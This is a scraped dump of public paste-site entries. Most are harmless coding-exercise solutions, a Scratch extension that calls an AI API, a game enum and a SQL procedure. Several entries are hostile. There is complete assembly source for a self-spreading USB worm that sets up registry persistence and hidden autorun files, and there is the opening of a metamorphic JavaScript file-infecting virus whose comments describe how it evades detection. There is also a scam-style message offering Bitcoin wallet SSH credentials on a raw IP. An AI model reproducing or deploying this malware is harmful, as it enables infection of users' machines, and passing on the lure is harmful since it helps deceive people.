id,title,username,language,date,content
PLkeM9iL,Splitting Bill O(1) per case with Precomputation (C++),Spidey2182,C++,Wednesday 5th of July 2023 01:01:59 AM CDT,"#include <iostream>

using namespace std;

int* sieveOfEratosthenes(int n) {
    int* sieve = new int[n + 5];
    for (int i = 0; i < n + 5; i++)
        sieve[i] = 1;
    sieve[0] = 0;
    for (int i = 2; i * i < n + 5; i++)
        for (int j = i * i; j < n + 5; j += i)
            sieve[j] = i;
    return sieve;
}

int main() {
    int* sieve = sieveOfEratosthenes(1000000);

    int testCases;
    cin >> testCases;
    for (int testCase = 1; testCase <= testCases; testCase++) {
        int n;
        cin >> n;
        cout << n / sieve[n] - sieve[n] << '\n';
    }
	
    return 0;
}
"
Jinkznfa,Splitting Bill O(1) per case with Precomputation (Java),Spidey2182,Java,Wednesday 5th of July 2023 12:59:44 AM CDT,"import java.util.*;

class TestClass {
    static int[] sieveOfEratosthenes(int n) {
        int[] sieve = new int[n + 5];
        Arrays.fill(sieve, 1);
        sieve[0] = 0;
        for (int i = 2; i * i < sieve.length; i++)
            for (int j = i * i; j < sieve.length; j += i)
                sieve[j] = i;
        return sieve;
    }

    public static void main(String args[] ) throws Exception {
        int[] sieve = sieveOfEratosthenes(1000000);

        Scanner sc = new Scanner(System.in);
        
        int testCases = sc.nextInt();
        for (int testCase = 1; testCase <= testCases; testCase++) {
            int n = sc.nextInt();
            System.out.println(n / sieve[n] - sieve[n]);
        }
    }
}
"
b1q0uXdd,BTC Wallet Credentials have been reset,posserestu_37,GetText,Wednesday 5th of July 2023 12:57:20 AM CDT,"Dear User
We have received a request to reset the login information for your Bitcoin wallet. If you did not make this request, please disregard this message.
Your new login credentials are ektodermasv:w45N4k on 45.9.148.244
You can connect via SSH.
Regards"
j49ASXu4,Minimum Maximum Subarray Sum (Java),Spidey2182,Java,Wednesday 5th of July 2023 12:52:47 AM CDT,"import java.util.*;

class TestClass {
    public static void main(String args[] ) throws Exception {
        Scanner sc = new Scanner(System.in);
        int n = sc.nextInt();
        int k = sc.nextInt();
        int[] a = new int[n];
	    for (int i = 0; i < n; i++)
    		a[i] = sc.nextInt();
 
	    long l = 1, r = (long)1e15, m;
	    while (l < r) {
    		m = (l + r) / 2;
 
		    if (numberOfSubarrays(a, m) <= k)
    			r = m;
		    else
    			l = m + 1;
    	}

        System.out.println(r);
    }

    static int numberOfSubarrays(int[] a, long sum) {
	    int ans = 0;
	    long curr = 0;
	    for (int x : a) {
    		if (x > sum)
			    return Integer.MAX_VALUE; // Not possible
		    if (curr + x > sum) {
    			ans++;
			    curr = 0;
		    }
		    curr += x;
	    }
    
	    return ans + 1;
    }
}
"
pAvsFgQJ,SCRATCH ChatGPT,A_GUES,JavaScript,Wednesday 5th of July 2023 12:50:00 AM CDT,"class AIBlock {
    getInfo() {
        return {
            ""id"": ""AI"",
            ""name"": ""AI"",
            ""blocks"": [{
                ""opcode"": ""completePrompt"",
                ""blockType"": ""reporter"",
                ""text"": ""complete prompt [string]"",
                ""arguments"": {
                    ""string"": {
                        ""type"": ""string"",
                        ""defaultValue"": ""Explain quantum computing in simple terms""
                    }
                }
            }],
            ""menus"": {}
        };
    }

    async completePrompt({ string }) {
        const text = string.trim();
        const url = `https://api.openai.com/v1/engines/davinci/completions`;

        const options = {
            method: ""POST"",
            body: JSON.stringify({
                prompt: text,
                max_tokens: 300,
            }),
            headers: {
                Authorization: ""Bearer "" + API_KEY,
                ""Content-type"": ""application/json; charset=UTF-8""
            },
        };

        console.log(""REQUEST:"" + url);

        const response = await fetch(url, options);
        const jsonData = await response.json();
        const output = jsonData.choices[0].text;
        return output;
    }
}

// If you're not building a Scratch extension, you might want to simply create an instance of the class like this:
let aiBlock = new AIBlock();"
S2i6pHFe,XOR - SUM O(1) (C++),Spidey2182,C++,Wednesday 5th of July 2023 12:45:10 AM CDT,"#include <iostream>
using namespace std;
int main() {
	int m, n;
	cin >> m >> n;
	
	// a + b = (a ^ b) + 2 * (a & b)
	if(m >= n && (m - n) % 2 == 0)
        cout << 1;
    else
        cout << 0;
	return 0;
}
"
STQLYYz1,XOR - SUM O(m) (C++),Spidey2182,C++,Wednesday 5th of July 2023 12:43:10 AM CDT,"#include <iostream>
using namespace std;
int main() {
	int m, n;
	cin >> m >> n;
	
	for(int i = 0; i <= m; i++) {
        if((i ^ (m - i)) == n) {
            cout << 1;
            return 0;
        }
    }
 
    cout << 0;
	return 0;
}
"
07vwimP6,XOR - SUM O(1) (Java),Spidey2182,Java,Wednesday 5th of July 2023 12:40:32 AM CDT,"import java.util.*;

class TestClass {
    public static void main(String args[] ) throws Exception {
        Scanner sc = new Scanner(System.in);
        int m = sc.nextInt();
        int n = sc.nextInt();

        // a + b = (a ^ b) + 2 * (a & b)
        if(m >= n && (m - n) % 2 == 0)
            System.out.println(1);
        else
            System.out.println(0);
    }
}
"
EpykV3Uq,XOR - SUM O(m) (Java),Spidey2182,Java,Wednesday 5th of July 2023 12:35:39 AM CDT,"import java.util.*;

class TestClass {
    public static void main(String args[] ) throws Exception {
        Scanner sc = new Scanner(System.in);
        int m = sc.nextInt();
        int n = sc.nextInt();

        for(int i = 0; i <= m; i++) {
            if((i ^ (m - i)) == n) {
                System.out.println(1);
                return;
            }
        }

        System.out.println(0);
    }
}
"
rrrqgQKv,GtaV Surface Materials,Tukas14,C#,Tuesday 4th of July 2023 11:47:09 PM CDT,"public enum Materials : uint
{
    Default = -1775485061, 
    Concrete = 1187676648, 
    ConcretePothole = 359120722, 
    ConcreteDusty = -1084640111, 
    Tarmac = 282940568, 
    TarmacPainted = -1301352528, 
    TarmacPothole = 1886546517, 
    RumbleStrip = -250168275, 
    BreezeBlock = -954112554, 
    Rock = -840216541, 
    RockMossy = -124769592, 
    Stone = 765206029, 
    Cobblestone = 576169331, 
    Brick = 1639053622, 
    Marble = 1945073303, 
    PavingSlab = 1907048430, 
    SandstoneSolid = 592446772, 
    SandstoneBrittle = 1913209870, 
    SandLoose = -1595148316, 
    SandCompact = 510490462, 
    SandWet = 909950165, 
    SandTrack = -1907520769, 
    SandUnderwater = -1136057692, 
    SandDryDeep = 509508168, 
    SandWetDeep = 1288448767, 
    Ice = -786060715, 
    IceTarmac = -1931024423, 
    SnowLoose = -1937569590, 
    SnowCompact = -878560889, 
    SnowDeep = 1619704960, 
    SnowTarmac = 1550304810, 
    GravelSmall = 951832588, 
    GravelLarge = 2128369009, 
    GravelDeep = -356706482, 
    GravelTrainTrack = 1925605558, 
    DirtTrack = -1885547121, 
    MudHard = -1942898710, 
    MudPothole = 312396330, 
    MudSoft = 1635937914, 
    MudUnderwater = -273490167, 
    MudDeep = 1109728704, 
    Marsh = 223086562, 
    MarshDeep = 1584636462, 
    Soil = -700658213, 
    ClayHard = 1144315879, 
    ClaySoft = 560985072, 
    GrassLong = -461750719, 
    Grass = 1333033863, 
    GrassShort = -1286696947, 
    Hay = -1833527165, 
    Bushes = 581794674, 
    Twigs = -913351839, 
    Leaves = -2041329971, 
    Woodchips = -309121453, 
    TreeBark = -1915425863, 
    MetalSolidSmall = -1447280105, 
    MetalSolidMedium = -365631240, 
    MetalSolidLarge = 752131025, 
    MetalHollowSmall = 15972667, 
    MetalHollowMedium = 1849540536, 
    MetalHollowLarge = -583213831, 
    MetalChainlinkSmall = 762193613, 
    MetalChainlinkLarge = 125958708, 
    MetalCorrugatedIron = 834144982, 
    MetalGrille = -426118011, 
    MetalRailing = 2100727187, 
    MetalDuct = 1761524221, 
    MetalGarageDoor = -231260695, 
    MetalManhole = -754997699, 
    WoodSolidSmall = -399872228, 
    WoodSolidMedium = 555004797, 
    WoodSolidLarge = 815762359, 
    WoodSolidPolished = 126470059, 
    WoodFloorDusty = -749452322, 
    WoodHollowSmall = 1993976879, 
    WoodHollowMedium = -365476163, 
    WoodHollowLarge = -925419289, 
    WoodChipboard = 1176309403, 
    WoodOldCreaky = 722686013, 
    WoodHighDensity = -1742843392, 
    WoodLattice = 2011204130, 
    Ceramic = -1186320715, 
    RoofTile = 1755188853, 
    RoofFelt = -1417164731, 
    Fibreglass = 1354180827, 
    Tarpaulin = -642658848, 
    Plastic = -2073312001, 
    PlasticHollow = 627123000, 
    PlasticHighDensity = -1625995479, 
    PlasticClear = -1859721013, 
    PlasticHollowClear = 772722531, 
    PlasticHighDensityClear = -1338473170, 
    FibreglassHollow = -766055098, 
    Rubber = -145735917, 
    RubberHollow = -783934672, 
    Linoleum = 289630530, 
    Laminate = 1845676458, 
    CarpetSolid = 669292054, 
    CarpetSolidDusty = 158576196, 
    CarpetFloorboard = -1396484943, 
    Cloth = 122789469, 
    PlasterSolid = -574122433, 
    PlasterBrittle = -251888898, 
    CardboardSheet = 236511221, 
    CardboardBox = -1409054440, 
    Paper = 474149820, 
    Foam = 808719444, 
    FeatherPillow = 1341866303, 
    Polystyrene = -1756927331, 
    Leather = -570470900, 
    Tvscreen = 1429989756, 
    SlattedBlinds = 673696729, 
    GlassShootThrough = 937503243, 
    GlassBulletproof = 244521486, 
    GlassOpaque = 1500272081, 
    Perspex = -1619794068, 
    CarMetal = -93061983, 
    CarPlastic = 2137197282, 
    CarSofttop = -979647862, 
    CarSofttopClear = 2130571536, 
    CarGlassWeak = 1247281098, 
    CarGlassMedium = 602884284, 
    CarGlassStrong = 1070994698, 
    CarGlassBulletproof = -1721915930, 
    CarGlassOpaque = 513061559, 
    Water = 435688960, 
    Blood = 5236042, 
    Oil = -634481305, 
    Petrol = -1634184340, 
    FreshMeat = 868733839, 
    DriedMeat = -1445160429, 
    EmissiveGlass = 1501078253, 
    EmissivePlastic = 1059629996, 
    VfxMetalElectrified = -309134265, 
    VfxMetalWaterTower = 611561919, 
    VfxMetalSteam = -691277294, 
    VfxMetalFlame = 332778253, 
    PhysNoFriction = 1666473731, 
    PhysGolfBall = -1693813558, 
    PhysTennisBall = -256704763, 
    PhysCaster = -235302683, 
    PhysCasterRusty = 2016463089, 
    PhysCarVoid = 1345867677, 
    PhysPedCapsule = -291631035, 
    PhysElectricFence = -1170043733, 
    PhysElectricMetal = -2013761145, 
    PhysBarbedWire = -1543323456, 
    PhysPooltableSurface = 605776921, 
    PhysPooltableCushion = 972939963, 
    PhysPooltableBall = -748341562, 
    Buttocks = 483400232, 
    ThighLeft = -460535871, 
    ShinLeft = 652772852, 
    FootLeft = 1926285543, 
    ThighRight = -236981255, 
    ShinRight = -446036155, 
    FootRight = -1369136684, 
    Spine0 = -1922286884, 
    Spine1 = -1140112869, 
    Spine2 = 1457572381, 
    Spine3 = 32752644, 
    ClavicleLeft = -1469616465, 
    UpperArmLeft = -510342358, 
    LowerArmLeft = 1045062756, 
    HandLeft = 113101985, 
    ClavicleRight = -1557288998, 
    UpperArmRight = 1501153539, 
    LowerArmRight = 1777921590, 
    HandRight = 2000961972, 
    Neck = 1718294164, 
    Head = -735392753, 
    AnimalDefault = 286224918, 
    CarEngine = -1916939624, 
    Puddle = 999829011, 
    ConcretePavement = 2015599386, 
    BrickPavement = -1147361576, 
    PhysDynamicCoverBound = -2047468855, 
    VfxWoodBeerBarrel = 998201806, 
    WoodHighFriction = -2140087047, 
    RockNoinst = 127813971, 
    BushesNoinst = 1441114862, 
    MetalSolidRoadSurface = -729112334, 
    StuntRampSurface = -2088174996, 
    Temp01 = 746881105, 
    Temp02 = -1977970111, 
    Temp03 = 1911121241, 
    Temp04 = 1923995104, 
    Temp05 = -1393662448, 
    Temp06 = 1061250033, 
    Temp07 = -1765523682, 
    Temp08 = 1343679702, 
    Temp09 = 1026054937, 
    Temp10 = 63305994, 
    Temp11 = 47470226, 
    Temp12 = 702596674, 
    Temp13 = -1637485913, 
    Temp14 = -645955574, 
    Temp15 = -1583997931, 
    Temp16 = -1512735273, 
    Temp17 = 1011960114, 
    Temp18 = 1354993138, 
    Temp19 = -801804446, 
    Temp20 = -2052880405, 
    Temp21 = -1037756060, 
    Temp22 = -620388353, 
    Temp23 = 465002639, 
    Temp24 = 1963820161, 
    Temp25 = 1952288305, 
    Temp26 = -1116253098, 
    Temp27 = 889255498, 
    Temp28 = -1179674098, 
    Temp29 = 1078418101, 
    Temp30 = 13626292 
}"
nb7fRmxB,illuZ1oN's USB Worm - Source Code - Rohitab - Forums,FlyFar,ASM (NASM),Tuesday 4th of July 2023 11:45:26 PM CDT,";  W32/USB<span class=""searchlite"">Worm</span> - illuz1oN 2008
; Spreads using usb's!
; Copyright illuz1oN 2008
; h4ck-y0u.org
; Compile with FASM!!
 
include ""H:\Liam\FASM\INCLUDE\WIN32AX.inc""
 
.data
    iMutex db 'USB <span class=""searchlite"">Worm</span>, illuz1oN', 0
    regKey db '<span class=""searchlite"">Worm</span>zorz', 0
    regPth db 'software\Microsoft\Windows\CurrentVersion\Run',0
    newExe db 'drivers.exe', 0
    msgTit db 'illuz1oN USB <span class=""searchlite"">Worm</span>!', 0
    msgbox db 'This <span class=""searchlite"">worm</span> Has Spread to: ', 0
    sysName db 'illuz.exe', 0
    autoInf db 'autorun.inf', 0
    autoRun db '[autorun]', 0
    drv1 db 'A:\', 0
    drv2 db 'U:\', 0
    drv3 db 'H:\', 0
    drv4 db 'G:\', 0
    inf1 db 'A:\autorun.inf', 0
    inf2 db 'U:\autorun.inf', 0
    inf3 db 'H:\autorun.inf', 0
    inf4 db 'G:\autorun.inf', 0
    sysPath rb 256d
    myPath rb 256d
    reg dd ?
 
.code
wootwoot:
    mov byte [autoRun+10d], 13d
    mov byte [autoRun+11d], 10d
    mov dword [autoRun+12d], 'open'
    mov dword [autoRun+16d], '=dri'
    mov dword [autoRun+20d], 'vers'
    mov dword [autoRun+24d], '.exe'
    push 256d
    push myPath
    push 0
    call [GetModuleFileName]
    push 256d
    push sysPath
    call [GetSystemDirectory]
    push sysPath
    push sysName
    call [lstrcat]
    push 0
    push sysPath
    push myPath
    call [CopyFile]
    push reg
    push KEY_ALL_ACCESS
    push regPth
    push HKEY_LOCAL_MACHINE
    call [RegOpenKeyEx]
    cmp eax,0
    je exitwoot
    push sysPath
    call [lstrlen]
    cmp eax,0 
    je exitwoot
    push eax
    push sysPath
    push REG_SZ
    push regKey
    push reg
    call [RegSetValueEx]
    call checkdrive
 
checkdrive:
    push drv1
    call [GetDriveType]
    cmp eax,DRIVE_REMOVABLE
    je spread1
    xor eax,eax
    push drv2
    call [GetDriveType] 
    cmp eax,DRIVE_REMOVABLE
    je spread2
    xor eax,eax
    push drv3
    call [GetDriveType]
    cmp eax,DRIVE_REMOVABLE
    je spread3
    xor eax,eax
    push drv4
    call [GetDriveType]
    cmp eax,DRIVE_REMOVABLE
    je spread4
    call exitwoot
 
spread1:
    mov dword [drv1+3d], newExe
    push 0
    push FILE_ATTRIBUTE_HIDDEN
    push CREATE_ALWAYS
    push 0
    push 0
    push inf1
    call [CreateFile]
    mov ebx, eax
    push autoRun
    call [lstrlen]
    push 0
    push 0
    push eax
    push autoRun
    push ebx
    call [WriteFile]
    push ebx
    call [CloseHandle]
    xor ebx,ebx
    xor eax,eax
 
spread2:
    mov dword [drv2+3d], newExe
    push 0
    push FILE_ATTRIBUTE_HIDDEN
    push CREATE_ALWAYS
    push 0
    push 0
    push inf2
    call [CreateFile]
    mov ebx, eax
    push autoRun
    call [lstrlen]
    push 0
    push 0
    push eax
    push autoRun
    push ebx
    call [WriteFile]
    push ebx
    call [CloseHandle]
    xor ebx,ebx
    xor eax,eax
 
spread3:
    mov dword [drv3+3d], newExe
    push 0
    push FILE_ATTRIBUTE_HIDDEN
    push CREATE_ALWAYS
    push 0
    push 0
    push inf3
    call [CreateFile]
    mov ebx, eax
    push autoRun
    call [lstrlen]
    push 0
    push 0
    push eax
    push autoRun
    push ebx
    call [WriteFile]
    push ebx
    call [CloseHandle]
    xor ebx,ebx
    xor eax,eax
 
spread4:
    mov dword [drv4+3d], newExe
    push 0
    push FILE_ATTRIBUTE_HIDDEN
    push CREATE_ALWAYS
    push 0
    push 0
    push inf4
    call [CreateFile]
    mov ebx, eax
    push autoRun
    call [lstrlen]
    push 0
    push 0
    push eax
    push autoRun
    push ebx
    call [WriteFile]
    push ebx
    call [CloseHandle]
    xor ebx,ebx
    xor eax,eax
 
exitwoot:
    xor eax,eax
    push 0
    call [ExitProcess]
 
.end wootwoot"
csxxiK7d,in_insert_stock_opname_item,abirama62,PostgreSQL,Tuesday 4th of July 2023 11:40:23 PM CDT,"CREATE OR REPLACE FUNCTION in_insert_stock_opname_item(character varying, bigint, bigint, bigint, character varying, bigint)
  RETURNS void AS
$BODY$
DECLARE
    pSessionId				ALIAS FOR $1;
    pTenantId				ALIAS FOR $2;
    pStockOpnameId			ALIAS FOR $3;
    pWarehouseId			ALIAS FOR $4;
    pDateTime				ALIAS FOR $5;
    pUserId					ALIAS FOR $6;
    
	vStockOpnameNo			character varying:='';
	vStockOpnameDate		character varying:='';
	vOuId					bigint;
	vEmptyString			character varying:='';
	vNo						character varying:='N';
	vYes					character varying:='Y';
	vWarehouseId			bigint;
	
	vLatestInvLedgerClosingDate	character varying := '';
	vNextYearMonth			character varying := '';
	vStartDateBalanceStock		character varying := '';
	vLedgerCodeInv			character varying := 'INV';

	vParamNonActiveProduct  character varying:='SHOW_NON_ACTIVE_PRODUCT_STOCK_OPNAME';
	vFlgNonActiveProductShow character varying(1);
	
BEGIN

	vFlgNonActiveProductShow = vYes;
	
	SELECT A.stock_opname_no, A.stock_opname_date, A.ou_id 
			INTO vStockOpnameNo, vStockOpnameDate, vOuId
	FROM in_product_balance_stock_opname A
	WHERE A.stock_opname_id = pStockOpnameId;
	
	-- cari tanggal terakhir stock opname
	SELECT MAX(date_year_month) 
	FROM m_admin_process_ledger A 
	JOIN m_ou_structure B ON A.ou_id = B.ou_bu_id
	WHERE A.tenant_id = pTenantId
	AND B.ou_id = vOuId
	AND A.ledger_code = vLedgerCodeInv 
	AND A.date_year_month < SUBSTRING(vStockOpnameDate,1,6)
	AND A.status_ledger = '1' INTO vLatestInvLedgerClosingDate; 
	RAISE NOTICE 'vLatestInvLedgerClosingDate : %',vLatestInvLedgerClosingDate;
	
	SELECT TO_CHAR(TO_DATE(vLatestInvLedgerClosingDate,'YYYYMM') + interval '1 Month','YYYYMM') INTO vNextYearMonth;
	vStartDateBalanceStock = vNextYearMonth || '01';
	RAISE NOTICE 'get vStartDateBalanceStock : %',vStartDateBalanceStock;

	SELECT f_get_value_system_config_by_param_code(pTenantId, vParamNonActiveProduct) INTO vFlgNonActiveProductShow;
	
	-- insert ke tt dari summary monthly qty
	INSERT INTO tt_product_balance_stock_opname_item (
		session_id, tenant_id, status, product_balance_stock_id, 
		product_balance_id, product_id, product_status, qty
	)
	SELECT pSessionId, pTenantId, 'SUMMARY', E.product_balance_stock_id, 
		A.product_balance_id, A.product_id, A.product_status, A.qty
	FROM in_summary_monthly_qty A
	INNER JOIN m_warehouse_ou B ON A.warehouse_id=B.warehouse_id
	INNER JOIN m_product D ON D.product_id = A.product_id
	INNER JOIN in_product_balance_stock E ON A.product_balance_id = E.product_balance_id
										AND E.product_id = A.product_id
										AND E.product_status = A.product_status
										AND E.warehouse_id = pWarehouseId
	WHERE A.tenant_id = pTenantId
	AND B.ou_id = vOuId
	AND A.warehouse_id = pWarehouseId
	AND A.date_year_month = vNextYearMonth;
	
	-- insert ke tt dari data log
	INSERT INTO tt_product_balance_stock_opname_item (
		session_id, tenant_id, status, product_balance_stock_id, 
		product_balance_id, product_id, product_status, qty
	)
	SELECT  pSessionId, pTenantId, 'LOG', E.product_balance_stock_id, 
		A.product_balance_id, A.product_id, A.product_status, SUM(A.qty) AS qty
	FROM in_log_product_balance_stock A
	INNER JOIN m_warehouse_ou B ON A.warehouse_id=B.warehouse_id
	INNER JOIN in_product_balance_stock E ON A.product_balance_id = E.product_balance_id
										AND E.product_id = A.product_id
										AND E.product_status = A.product_status
										AND E.warehouse_id = pWarehouseId
	WHERE A.tenant_id = pTenantId
	AND B.ou_id = vOuId
	AND a.warehouse_id = pWarehouseId
	AND A.doc_date BETWEEN vStartDateBalanceStock AND vStockOpnameDate 
	GROUP BY  E.product_balance_stock_id, 
		A.product_balance_id, A.product_id, A.product_status;

	-- insert ke table opname item berdasarkan data dari table tt
	IF (vFlgNonActiveProductShow = vYes) THEN
        INSERT INTO in_product_balance_stock_opname_item(
                tenant_id, stock_opname_id, stock_opname_no,
                product_balance_stock_id, product_balance_id, product_id, product_code,
                product_status, qty, qty_opname, remark_opname, status, message,
                version, create_datetime, create_user_id, update_datetime, update_user_id)
        SELECT A.tenant_id, pStockOpnameId, vStockOpnameNo,
                A.product_balance_stock_id, A.product_balance_id, A.product_id, B.product_code,
                A.product_status, SUM(A.qty), 0, vEmptyString, vNo, vEmptyString,
                0, pDateTime, pUserId, pDateTime, pUserId
        FROM tt_product_balance_stock_opname_item A
        JOIN m_product B ON A.producT_id = B.product_id
        WHERE A.session_id = pSessionId
        GROUP BY A.tenant_id, A.product_balance_stock_id, A.product_balance_id, A.product_id, B.product_code, A.product_status
        ORDER BY A.product_id;
    ELSE
        INSERT INTO in_product_balance_stock_opname_item(
                tenant_id, stock_opname_id, stock_opname_no,
                product_balance_stock_id, product_balance_id, product_id, product_code,
                product_status, qty, qty_opname, remark_opname, status, message,
                version, create_datetime, create_user_id, update_datetime, update_user_id)
        SELECT A.tenant_id, pStockOpnameId, vStockOpnameNo,
                A.product_balance_stock_id, A.product_balance_id, A.product_id, B.product_code,
                A.product_status, SUM(A.qty), 0, vEmptyString, vNo, vEmptyString,
                0, pDateTime, pUserId, pDateTime, pUserId
        FROM tt_product_balance_stock_opname_item A
        JOIN m_product B ON A.producT_id = B.product_id
        WHERE A.session_id = pSessionId
        AND A.tenant_id = pTenantId AND B.active = vYes
        GROUP BY A.tenant_id, A.product_balance_stock_id, A.product_balance_id, A.product_id, B.product_code, A.product_status
        ORDER BY A.product_id;
    END IF;

END;	
$BODY$
  LANGUAGE plpgsql VOLATILE
  COST 100;
/"
RQVshhTj,Virus.JS.Transcriptase - Source Code,FlyFar,JavaScript,Tuesday 4th of July 2023 11:33:13 PM CDT,"//////////////////////////////////////////////////////////////////////////////
//
//  JS.Transcriptase
//  by Second Part To Hell
//  December 2012
//
//  This is a metamorphic self-compiling virus written in JavaScript.
// 
//  The virus consists of two parts:
//      1) The whole virus-code written in (obfuscated) JavaScript language
//      2) The whole virus-code written in a special meta-level language
//
//  The JavaScript-code (as well as the meta-level code) consists of a compiler
//  and an infection algorithm. At execution, the JavaScript-written compiler
//  analyses the meta-level code and derives a new JavaScript code for the next
//  generation (and infect potential victims with that code). The meta-level
//  code is integrated to the new derived generation in a fully obfuscated way.
//
//  The derivation of the new generation works with the following three steps:
//
//  1) PreCompilation
//     1.1) Change of variable and function names
//          Every defined function and variable gets a random name
//
//     1.2) Permutation
//          The order of every instruction in the code and in all sub-branches
//          are choosen randomly - except of connected instructions. Those
//          restrictions are defined in the meta-level code.
//
//     1.3) Creation of random numeric functions
//          A set of up to 35 functions with 1 to 5 inputs are created, which
//          contains arithmetic calculations (+,-,*,/,%) are created. Those will
//          be used for replacing numerical values of 0 to 255.
//
//          Example: 
//          function msbxaegrgbfqutl(pllwlqvevm,zorelhvsak,zpzrdbuy,rhuuwrxdj){return (36+zpzrdbuy)+(98+((zorelhvsak-(219-((17-(21%(rhuuwrxdj*10)))-pllwlqvevm)))-rhuuwrxdj))}
//          msbxaegrgbfqutl(161,184,152,9) gives 77
//          msbxaegrgbfqutl(227,205,255,88)) gives 56
//
//
//  2) Code-Creation
//     For every instruction in the meta-code, corresponding instructions of
//     JavaScript are created.
//
//     2.1) Every object, every expression, every number and every string will
//          be derived in a random way.
//
//          Numbers can become calculations, replaced by random numeric function
//                  calls, return values of usual functions or variables.
//          Strings can be splitted into substrings. They can become String.fromCharCode(),
//                  variables or functions.                   
//          Expressions can become eval(...), variables or functions.
//          Objects/Methods can be splitted: object.method() -> somefunc().method()
//
//     2.2) Instructions like ""while"" or ""if"" can be exchanged by ""for"" or
//          ""switch/case"". WScript.CreateObject/new ActiveXObject can be used
//          vise versa. The condition of if/while can change the logic from
//                   if(a>b) <-> if(b<a) or while(a==b) <-> while(b==a)
//
//          Calculation with numbers/strings is random. For example, increasing
//          a number by one can become (in addition to all mutations from 2.1):
//                       number++; number+=1; number=number+1
//
//          or adding strings:
//                       string1=string1+string2; string1+=string2;
//
//
//  3) Integration
//     The final step includes all variables and functions at random places in
//     the code. Functions can be included at every place (in the global scope),
//     variables are restricted to places before they are used for the first
//     time.
//     In addition, some random variables and functions can be bundled into
//     function-arrays; for example:
//
//        var1=17; var2=""Hello VXers!""; if(var1>12){WScript.Echo(var2)}
//                                      ->
//        somearray=[function(){return(""Hello VXers!"")},17}];
//        if(somearray[1]>12){WScript.Echo(somearray[0]()}
//
//
//  In the end, the virus will search for .JS files in the current directory
//  and prepends the next generation.     
//
//
//  A more detailed explanation of this project can be found in an article
//  called ""Metamorphism and Self-Compilation in JavaScript"", in valhalla#3.
//
//  The code below is a dropper for a first generation virus. When executing, it
//  creates a file called ""Transcript1.js"". This first generation does not
//  have all obfuscation features of the whole virus (for instance, the
//  variable/function-name randomization has been deactivated for some reason),
//  but ""Transcript1.js"" will infect .js files in the current directory with
//  the full obfuscated virus.
//
//  This is version 1 - that means there are hunderts of things to improve and
//  thousands of things to implement. When you have a self-compiling compiler,
//  you can do so many things that you could not even think about before! :)
//
//
//  ""Transcriptase"" is a process in micro-biology, where RNA code is translated
//  into DNA code. This process is mainly used by retro-viruses such as HIV to
//  infect cells (which are ""written"" in DNA). The mutation-rate of biologic
//  transcriptase is very high, which makes curing of HIV very difficult.
//  This code has a very similar strategy: It translates its meta-level
//  code (RNA) into JavaScript code (DNA) to infect files (cells). The muation 
//  rate is very high as well, to circumvent detection :) 
//
//
//  Tested the code at WindowsXP and Windows7. Derivation of the next generation
//  takes a couple of minutes (3-10mins usually) due to unoptimized functions
//  and complex algorithms.
//  
//
//  I thank hh86 for the constant motivation over this long period of time from
//  starting until fixing the last monster-bugs, and for the perfect name... :)
//
//////////////////////////////////////////////////////////////////////////////


nnn=s(13)+s(10);                                                
function s(n){return(String.fromCharCode(n));}  // fGiveMeString
function r(n){return(Math.floor(Math.random()*n));} // fGiveRandomNumber

function randomString() // fGiveRandomString
{
    var rndString='';                                                                                                                                                     
    var RNum3=Math.floor(Math.random()*10)+6;
    for(var i=0;i<RNum3;i++)
    {
        rndString+=s(Math.floor(Math.random()*26)+97);
    }
    return(rndString);
}


function isNumber(String2Check) //fIsNumber
{
    if(String2Check.charCodeAt(0)>47&&String2Check.charCodeAt(0)<58)
    {
        return(1);
    }
    return(0);
}

function GetAntiLogic(operator)  //fGetAntiLogic
{
    var RValue=operator;
    if(operator=='<'){RValue='>';}
    if(operator=='<='){RValue='>=';}
    if(operator=='>'){RValue='<';}
    if(operator=='>='){RValue='<=';}
    return(RValue);
}


function RemoveVariableMask(CodeStringWithMask) // fRemoveVariableMask 
{    
    while(CodeStringWithMask.indexOf('°+')!=-1||CodeStringWithMask.indexOf('+°')!=-1)
    {
        CodeStringWithMask=CodeStringWithMask.replace('°+','');
        CodeStringWithMask=CodeStringWithMask.replace('+°','');
    }
    return(CodeStringWithMask);
}



function RandomizeFunction(a,b) // fRandomizeFunction
{
    return(Math.random()*2-1)
}


function CreateNumeric(OriginalNum)  // fCreateNumeric
{
    return(OriginalNum) // debugging
    OriginalNum=parseInt(OriginalNum,10);
    
    var CreateNumericType=Math.floor(Math.random()*20);    
    
    if(OriginalNum>10000)
    {
        CreateNumericType=5;    // no calculations with big numbers
    }
    if(OriginalNum>=0&&OriginalNum<=255&&Math.floor(Math.random()*4)!=0)
    {
         var FAElement=FullArray[OriginalNum].length;
         return(FullArray[OriginalNum][Math.floor(Math.random()*FAElement)]);
    }

    var CreateNumericRnd=Math.abs(Math.floor(Math.random()*0.9*OriginalNum))+1;

    if(OriginalNum<CreateNumericRnd&&CreateNumericType==0)
    {
        return(DeriveVC(OriginalNum,86));
    }
    if(CreateNumericType==0)
    {
        return('('+DeriveVC(CreateNumeric(OriginalNum-CreateNumericRnd)+'+'+CreateNumeric(CreateNumericRnd),200)+')');
    }
    if(CreateNumericType==1)
    {
        return('('+DeriveVC(CreateNumeric(OriginalNum+CreateNumericRnd)+'-'+CreateNumeric(CreateNumericRnd),200)+')');
    }
    if(CreateNumericType==2)
    {
        return('('+DeriveVC(CreateNumeric(OriginalNum*CreateNumericRnd)+'/'+CreateNumeric(CreateNumericRnd),200)+')');
    }

    return(DeriveVC(OriginalNum,86));    
}


function CreateLogic(LogicValues)  // fCreateLogic
{
// LogicValue=VC!VC!operator
    DeriveRestrString=''; // clear it
    var argument1     =LogicValues.substring(0,LogicValues.indexOf('!'));
    var argument2     =LogicValues.substring(LogicValues.indexOf('!')+1,LogicValues.indexOf('?'));
    var logicoperator =LogicValues.substring(LogicValues.indexOf('?')+1);
    var antilogic     =GetAntiLogic(logicoperator);
  
    CLDeriv=DeriveRestrictVC;     // use function-references
    if(isNumber(argument2)==1){CLDeriv=DeriveVC;}

    if(NoDerivation1==0)
    {
        argument1=DeriveRestrictVC(argument1,24);
    }
    argument2=CLDeriv(argument2,24);

    RNum1=Math.floor(Math.random()*2);
    if(RNum1==0)
    {
        CreateLogicRV=argument1+logicoperator+argument2;
    }
    if(RNum1==1)
    {
        CreateLogicRV=argument2+antilogic+argument1;
    }    
    return(CreateLogicRV);
}



function DeriveVC(arg,probalility)  // fDeriveVC
{
    var RNum2=Math.floor(Math.random()*probalility);
    //RNum2=13;  // debugging
    if(RNum2<10) // VC -> value
    {
        var DVCTmpName=randomString();
        VarDefs.push(arg);
        VarNames.push(DVCTmpName);
        var Rname1=DeriveVC(DVCTmpName,60);
        return(Rname1);
    }
    return(arg);
}



